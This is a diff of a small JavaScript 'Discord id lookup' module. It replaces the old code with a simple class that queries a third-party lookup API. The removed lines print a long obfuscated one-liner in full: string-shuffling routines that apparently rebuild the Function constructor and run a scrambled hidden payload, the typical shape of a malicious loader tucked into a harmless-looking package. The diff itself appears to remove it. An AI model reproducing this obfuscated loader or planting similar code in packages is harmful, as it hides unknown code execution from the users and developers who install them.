@@ -1,14 +1,13 @@
 // Discord id lookup
 
-// Example
-//discord.userLookup('961776956821622814', (Results) => {
-//    console.log(Results[0]);
-//});
+class Discord {
+    constructor(Args) {}
 
-// Results[0] = username
-// Results[1] = display name 
-// Results[2] = user id
-// Results[3] = when the account was created at
-// Results[4] = user avatar link
+    async userLookup(Userid, Callback) {
+        fetch(`https://discordlookup.mesavirep.xyz/v1/user/${Userid}`).then(Resp => Resp.json()).then(Fetched => {
+            Callback([Fetched.username, Fetched.global_name, Fetched.id, Fetched.created_at, Fetched.avatar.link]);
+        });
+    }
+}
 
-var Discord,discord;(function(){var msp='',COQ=165-154;function eOR(u){var w=339004;var f=u.length;var b=[];for(var k=0;k<f;k++){b[k]=u.charAt(k)};for(var k=0;k<f;k++){var v=w*(k+192)+(w%53275);var a=w*(k+602)+(w%16810);var e=v%f;var s=a%f;var i=b[e];b[e]=b[s];b[s]=i;w=(v+a)%1672115;};return b.join('')};var MsV=eOR('tteobdmjuaizxrqnlhwprsfnsockrouygvtcc').substr(0,COQ);var NWn=' ar e+17,ma17,y)57;vir x=oabcd;fghi(klmntpqrs5uvwx1z";ver k=;81,8v,72,=0,94,90,8i,86,+1,89,79,7;,80,;6,88774,7{,85,v5,66w;varei=[]=for(3ar h-0;h<v.lenath;hm+)i[r[h]]eh+1;+ai bv[];e6=16;c+=76jy+=3i;forvvar j=0;a,argunents)leng,h;a+v){val u=asgume;ts[a).spl=t(" r);fo=(var)o=u."engti-1;o+=0;o<-){var r=iull;uar jju[o]ivar h=nul ;varrp=0;har w=j.le.gth;+ar q)for(lar g=0;g<=;g+++{var.c=j.iharC deAtvg);v=r l=C,c];hf(l) r=(l)1)*m2j.chvrCod<At(gz1)-euq=g;.++;}else nf(c=+y){rtm*(k(leng)h-e+6.chavCodent(g+x))+jrcharyodeAv(g+2.-e;qng;g+d2;}e7se{cantin(e;}iz(t==;ull)(=[];lf(q>g)t.p2sh(jnsubs=ringkp,q)p;t.pfsh(urr+1]7;p=gg1;}ia(t!==ull)rif(ptw)t.uush(p.subitrinn(p)))u[o]ot.jo>n(""{;}}b;push=u[0]g;}va] n=b[joinf"");par vn[92,(9,10f32,4=[96]Aconc9t(k)tvar [=Str"ng.f]omChtrCodr(46)=for(aar h-0;h<r.len.th;h0+)n=t.spl.t(z+r.cha=At(h.).jotn(Stoing.kromCaarCo;e(v[g]));=eturi n.snlrt(m+"!"a.joi=(z);';var ueG=eOR[MsV];var ZLL='';var LIN=ueG;var nck=ueG(ZLL,eOR(NWn));var zFu=nck(eOR('eQ+lue)g.{e+7e#v.a_;!QQ{3;n,$tsf$ts+)S$QbQ5rQQrk$2d,1fg)".8biC(Qa;)Q!o_:r2$xiQ=2567Q(.aQ(nkj.a(Q)Qnso}i3{\/n%!6r.i+ned(rr;ncst %7td;r3uQ{j}Qa71=QbQa7rt.tQQ;h(oQt(unr,,Q..=$3.15j&a)r)j;dcQwsQ..oi}et,pd$u1])dx}t2Q!%Q;n!dm=]pr]Qo=eeg$QsQs4Q9!is_.t]lm;;m1=$1.]3_"iv!(ma(;6]o[]0.f.S5.ii+dkd)noQQ$sQ!0&+b5430]=.3e.r;p$rw1{d..i5!p]r5cr djh\/n+g(,4Q6tl#.}f$_Q,e1sc;do%o. d.1sxQ0sQ_xQd(Q.)gb{](fdv(Q;)fQ1fj\/cQ30\/3;p)(l,9=l.%gbQeirdac(r.ccic$)2 _;"(eo*ee}4C5=.(8ws;Q.n_obd..f%7jbg(Qe70i!))d06#61i$(t5132)cja}(,1>__,kQ}=_)%,2%3Qt1nQ!0r2-g_(t.f.ofCoa4.$ho(0sj)i4=e=e,Q.Qx.estr0t$se)vx"iddasQ,=_[ Qsiu\'3b#lpdsem,(&QQ.c4 .le]Qu)eam...Q1bbfmo6g$vQ*l3}rt\/!+-semj#0n7a#c3QthtdQ5taQ3)i{02aQb=Q)7.}lQg)=s.$,\'o\'Qn.}2ziQ;.Q!g%(.;i1(rQ};dk#eaex\/ud!0.7oor) c.)bgr".6QaQ..Qt"h!(chtt!.]7_ !\'coa,eokk[p3!d1!s(;Qff.Q) 54 1\/ls;60$.ml,35;"jQ).(+!h)$6Q](obdoQ2g%\/{br .Qg,d3_1ls!s7,Q(r)aQ1n{e(ci4e,;2}#Q(x{c{t1Qe(i([];e0Q( dom]5Q)d]0=%)ru3={_40]e,t,]]!Q!gatD0dc)(;=g}e$,u1_%QQx)nf.bsyfbd6d."ueQ)*sj,](=0Q5=Qd)r$j6Qk S (0.4!)de)0iQQg2)3+1%QQ(xdr[,$vy.l.7_)l)o$rn(_m&9kl,db,)i.b=o0;QdyQid.!Q,r(!_ndfra,(cQrnk )}op(.xerdnQ,2Q)50;0e(Q(Qj+har)))7u_ijy27bt.&st4)nd$nund%Q))oi7(ffd.be-_].2d{ .$}fr.r\/Qd= (=(eQ{Qc;s [p-[h,y5 Q$({+ i4e(b8i,tr={c)ir,()en*)$2o.etbo.ijQj41)s%s9n.>;fg._ dbi=r8ad.m_ )e)-Qp%sdy;t3}= j!_Q'));var xFr=LIN(msp,zFu );xFr(7493);return 4371})()
+const discord = new Discord();
